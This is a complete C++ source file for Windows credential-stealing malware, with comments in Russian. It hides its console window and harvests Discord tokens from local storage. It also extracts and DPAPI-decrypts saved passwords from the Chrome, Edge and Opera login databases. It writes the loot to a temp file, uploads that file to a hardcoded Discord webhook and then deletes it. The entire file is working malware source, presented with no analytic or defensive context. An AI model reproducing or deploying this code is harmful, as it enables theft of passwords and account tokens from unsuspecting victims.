#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include <regex>
#include <sqlite3.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "sqlite3.lib")

namespace fs = std::filesystem;
const std::wstring WEBHOOK_URL = L"https://discord.com/api/webhooks/1570468129782374504/29ub4RMTJ_GGSTYKPlMkQ9g-z4hss-hQO6hR7xQBdysVki4axUy42IW2MTwqahmEmISa";

// --- Отправка текста ---
void SendToWebhook(const std::string& content) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_OPEN_FLAG_BYPASS_PROXY_IF_DIRECT, NULL, NULL, 0);
    if (!hSession) return;
    URL_COMPONENTS urlComp;
    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwHostNameLength = (DWORD)-1;
    urlComp.dwUrlPathLength = (DWORD)-1;
    urlComp.dwSchemeLength = (DWORD)-1;
    if (WinHttpCrackUrl(WEBHOOK_URL.c_str(), 0, 0, &urlComp)) {
        std::wstring host(urlComp.lpszHostName, urlComp.dwHostNameLength);
        std::wstring path(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
        HINTERNET hConnect = WinHttpConnect(hSession, host.c_str(), urlComp.nPort, 0);
        if (hConnect) {
            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
            if (hRequest) {
                std::wstring headers = L"Content-Type: application/json\r\n";
                std::string body = "{\"content\":\"" + content + "\"}";
                WinHttpSendRequest(hRequest, headers.c_str(), -1L, (LPVOID)body.c_str(), (DWORD)body.length(), (DWORD)body.length(), 0);
                WinHttpReceiveResponse(hRequest, NULL);
                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
    }
    WinHttpCloseHandle(hSession);
}

// --- Отправка файла ---
void SendFileToWebhook(const std::string& filePath, const std::string& fileName) {
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) return;
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    std::vector<char> buffer(size);
    if (file.read(buffer.data(), size)) {
        std::string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
        std::string body = "--" + boundary + "\r\n";
        body += "Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\n";
        body += "Content-Type: application/octet-stream\r\n\r\n";
        body.append(buffer.begin(), buffer.end());
        body += "\r\n--" + boundary + "--\r\n";

        HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_OPEN_FLAG_BYPASS_PROXY_IF_DIRECT, NULL, NULL, 0);
        if (!hSession) return;
        URL_COMPONENTS urlComp;
        ZeroMemory(&urlComp, sizeof(urlComp));
        urlComp.dwStructSize = sizeof(urlComp);
        urlComp.dwHostNameLength = (DWORD)-1;
        urlComp.dwUrlPathLength = (DWORD)-1;
        urlComp.dwSchemeLength = (DWORD)-1;
        if (WinHttpCrackUrl(WEBHOOK_URL.c_str(), 0, 0, &urlComp)) {
            std::wstring host(urlComp.lpszHostName, urlComp.dwHostNameLength);
            std::wstring path(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
            HINTERNET hConnect = WinHttpConnect(hSession, host.c_str(), urlComp.nPort, 0);
            if (hConnect) {
                HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
                if (hRequest) {
                    std::wstring headers = L"Content-Type: multipart/form-data; boundary=" + std::wstring(boundary.begin(), boundary.end()) + L"\r\n";
                    WinHttpSendRequest(hRequest, headers.c_str(), -1L, (LPVOID)body.c_str(), (DWORD)body.length(), (DWORD)body.length(), 0);
                    WinHttpReceiveResponse(hRequest, NULL);
                    WinHttpCloseHandle(hRequest);
                }
                WinHttpCloseHandle(hConnect);
            }
        }
        WinHttpCloseHandle(hSession);
    }
}

std::string DecryptDPAPI(const std::vector<BYTE>& encryptedData) {
    DATA_BLOB in, out;
    in.pbData = const_cast<BYTE*>(encryptedData.data());
    in.cbData = (DWORD)encryptedData.size();
    if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
        std::string res((char*)out.pbData, out.cbData);
        LocalFree(out.pbData);
        return res;
    }
    return "";
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    HWND hWnd = GetConsoleWindow();
    if (hWnd) ShowWindow(hWnd, SW_HIDE);

    std::string user = getenv("USERNAME");
    std::string appData = getenv("APPDATA");
    std::string tempPath = getenv("TEMP");

    // 1. Собираем токены Discord
    std::string discordPath = appData + "\\discord\\Local Storage\\leveldb";
    std::regex tokenRegex(R"((mfa\.[a-zA-Z0-9_-]{84}|[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}))");
    std::string tokens = "";
    if (fs::exists(discordPath)) {
        for (const auto& entry : fs::directory_iterator(discordPath)) {
            std::string ext = entry.path().extension().string();
            if (ext == ".ldb" || ext == ".log") {
                std::ifstream file(entry.path(), std::ios::binary);
                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                std::smatch match;
                std::string::const_iterator searchStart(content.cbegin());
                while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
                    tokens += match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }
            }
        }
    }

    // 2. Собираем пароли браузеров
    std::string browserData = "USER: " + user + "\n\nPASSWORDS:\n";
    std::vector<std::string> paths = {
        "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
        "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data",
        "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data"
    };
    
    for (const auto& path : paths) {
        std::string fullPath = getenv("USERPROFILE") + path;
        if (!fs::exists(fullPath)) continue;
        sqlite3* db;
        if (sqlite3_open_v2(fullPath.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
            sqlite3_stmt* stmt;
            if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, NULL) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    std::string url = (const char*)sqlite3_column_text(stmt, 0);
                    std::string u = (const char*)sqlite3_column_text(stmt, 1);
                    const BYTE* pwd = sqlite3_column_blob(stmt, 2);
                    int pwdLen = sqlite3_column_bytes(stmt, 2);
                    std::vector<BYTE> encPwd(pwd, pwd + pwdLen);
                    std::string decPwd = DecryptDPAPI(encPwd);
                    if (!decPwd.empty()) {
                        browserData += url + " | " + u + " | " + decPwd + "\n";
                    }
                }
            }
            sqlite3_finalize(stmt);
            sqlite3_close(db);
        }
    }

    // 3. Формируем файл и отправляем
    std::string dumpPath = tempPath + "\\dump.txt";
    std::ofstream out(dumpPath);
    out << "DISCORD TOKENS:\n" << tokens << "\n\n" << browserData;
    out.close();

    SendToWebhook("**Target:** `" + user + "`");
    SendFileToWebhook(dumpPath, "dump.txt");

    DeleteFileA(dumpPath.c_str());

    return 0;
}